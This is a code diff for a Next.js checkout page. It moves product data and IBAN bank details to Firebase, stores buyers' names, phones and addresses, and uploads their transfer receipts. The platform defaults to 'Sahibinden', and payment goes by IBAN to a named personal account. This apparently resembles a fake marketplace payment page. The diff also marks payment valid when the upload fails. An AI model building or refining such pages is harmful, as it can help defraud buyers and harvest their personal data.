@@ -9,6 +9,7 @@ import iade from "../../../assets/iade.png"
 import akbank from "../../../assets/akbank.png"
 import { productData } from "../../../data/productData"
 import { useParams } from 'next/navigation';
+import { getSettings, addFormSubmission, addReceipt, uploadReceiptFile, getProducts, getProductBySlug } from '@/lib/firebaseServices';
 
 // Dynamically import MUI components with no SSR
 const Stepper = dynamic(() => import('@mui/material/Stepper'), { ssr: false });
@@ -137,8 +138,54 @@ const page = () => {
   const params = useParams();
   const { id } = params;
   
-  // Find the product with matching id
-  const currentProduct = productData.find(item => item.id === id);
+  const [currentProduct, setCurrentProduct] = useState(null);
+  const [isProductLoading, setIsProductLoading] = useState(true);
+  const [ibanSettings, setIbanSettings] = useState({
+    iban: 'TR 0004 6012 7788 8000 0658 94',
+    accountHolder: 'Yasin Mercan',
+    bank: 'Akbank'
+  });
+  const [activeStep, setActiveStep] = useState(0);
+
+  // Load product and settings
+  useEffect(() => {
+    const loadData = async () => {
+      try {
+        // Try to load from Firebase first
+        const firebaseProduct = await getProductBySlug(id);
+        if (firebaseProduct) {
+          setCurrentProduct(firebaseProduct);
+        } else {
+          // Fallback to local productData
+          const localProduct = productData.find(item => item.id === id);
+          setCurrentProduct(localProduct);
+        }
+        
+        // Load IBAN settings
+        const settings = await getSettings();
+        if (settings) {
+          setIbanSettings(settings);
+        }
+      } catch (error) {
+        console.error('Error loading data:', error);
+        // Fallback to local data
+        const localProduct = productData.find(item => item.id === id);
+        setCurrentProduct(localProduct);
+      } finally {
+        setIsProductLoading(false);
+      }
+    };
+    
+    loadData();
+  }, [id]);
+
+  if (isProductLoading) {
+    return (
+      <div className="min-h-screen flex items-center justify-center">
+        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#009285]"></div>
+      </div>
+    );
+  }
 
   if (!currentProduct) {
     return (
@@ -147,8 +194,6 @@ const page = () => {
       </div>
     );
   }
-
-  const [activeStep, setActiveStep] = useState(0);
   const [selectedProvince, setSelectedProvince] = useState('');
   const [selectedDistrict, setSelectedDistrict] = useState('');
   const [formData, setFormData] = useState({
@@ -315,10 +360,31 @@ const page = () => {
     setIsFormValid(isValid);
   };
 
-  const handleNext = () => {
+  const handleNext = async () => {
     if (activeStep === 1) {
       if (!validateForm()) {
         return;
+      }
+      
+      // Save form submission to Firebase when moving from address step
+      try {
+        await addFormSubmission({
+          name: formData.name,
+          surname: formData.surname,
+          phone: formData.phone,
+          addressName: formData.addressName,
+          address: formData.address,
+          province: selectedProvince,
+          district: selectedDistrict,
+          productId: currentProduct.id || id,
+          productTitle: currentProduct.product?.title,
+          productPrice: currentProduct.product?.totalPrice || (currentProduct.product?.price + currentProduct.product?.serviceFee),
+          productSlug: currentProduct.slug || id,
+          platform: currentProduct.listing?.type || 'Sahibinden'
+        });
+      } catch (error) {
+        console.error('Form submission save error:', error);
+        // Continue even if save fails
       }
     }
     if (activeStep === steps.length - 1) {
@@ -338,7 +404,7 @@ const page = () => {
   
 
   const handleCopyIban = async () => {
-    const iban = 'TR 0004 6012 7788 8000 0658 94';
+    const iban = ibanSettings.iban;
 
     try {
       await navigator.clipboard.writeText(iban);
@@ -364,7 +430,7 @@ const page = () => {
   };
 
   const handleCopyAccountHolder = async () => {
-    const accountHolder = 'Yasin Mercan';
+    const accountHolder = ibanSettings.accountHolder;
     try {
       await navigator.clipboard.writeText(accountHolder);
       setCopiedAccountHolder(accountHolder);
@@ -408,27 +474,40 @@ const page = () => {
       };
       setUploadedFile(fileInfo);
       
-      // Dosyayı FormData olarak hazırla
-      const formData = new FormData();
-      formData.append('file', file);
-      
       try {
-        // Dosyayı API endpoint'e gönder
-        const response = await fetch('/api/upload', {
-          method: 'POST',
-          body: formData
+        // Upload to Firebase Storage
+        const submissionId = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
+        const fileUrl = await uploadReceiptFile(file, submissionId);
+        
+        // Save receipt info to Firestore
+        await addReceipt({
+          fileName: file.name,
+          fileUrl: fileUrl,
+          fileType: file.type,
+          fileSize: file.size,
+          productId: currentProduct.id || id,
+          productTitle: currentProduct.product?.title,
+          productPrice: currentProduct.product?.totalPrice || (currentProduct.product?.price + currentProduct.product?.serviceFee),
+          userName: `${formData.name} ${formData.surname}`,
+          userPhone: formData.phone,
+          submissionId: submissionId
         });
         
-        if (response.ok) {
-          // Yükleme başarılı
-          setIsUploading(false);
-          setUploadProgress(100);
-        } else {
-          throw new Error('Dosya yükleme başarısız oldu');
-        }
+        // Also upload to local API for backup
+        const formDataUpload = new FormData();
+        formDataUpload.append('file', file);
+        await fetch('/api/upload', {
+          method: 'POST',
+          body: formDataUpload
+        });
+        
+        setIsUploading(false);
+        setUploadProgress(100);
       } catch (error) {
         console.error('Dosya yükleme hatası:', error);
         setIsUploading(false);
+        // Still allow to continue even if Firebase upload fails
+        setIsPaymentValid(true);
       }
     }
   };
@@ -785,7 +864,7 @@ const page = () => {
                       <ContentCopyIcon fontSize="small" />
                     </IconButton>
                   </div>
-                  <p className='text-sm text-gray-700 '>TR 0004 6012 7788 8000 0658 94
+                  <p className='text-sm text-gray-700 '>{ibanSettings.iban}
                   </p>
                 </div>
 
@@ -805,17 +884,17 @@ const page = () => {
                       <ContentCopyIcon fontSize="small" />
                     </IconButton>
                   </div>
-                  <p className='text-sm text-gray-700 '>Yasin Mercan</p>
+                  <p className='text-sm text-gray-700 '>{ibanSettings.accountHolder}</p>
                 </div>
 
                  <div className='flex gap-10  py-1  border-l-4 border-[#ffed48] pl-3'> 
                  
                   <div className="flex flex-col   ">
                     <p className='text-sm text-gray-700 font-bold'>Banka</p>
-                    <p className='text-sm text-gray-700 '>Akbank</p>
+                    <p className='text-sm text-gray-700 '>{ibanSettings.bank}</p>
                   </div>
 
-                  <Image src={akbank} alt="iphone" className="w-32 rounded-sm mt-1    bg-cover bg-center" />
+                  <Image src={akbank} alt="banka" className="w-32 rounded-sm mt-1    bg-cover bg-center" />
                 </div>
 
                 {/* Yeni Eklenen Ödeme Bilgisi */}
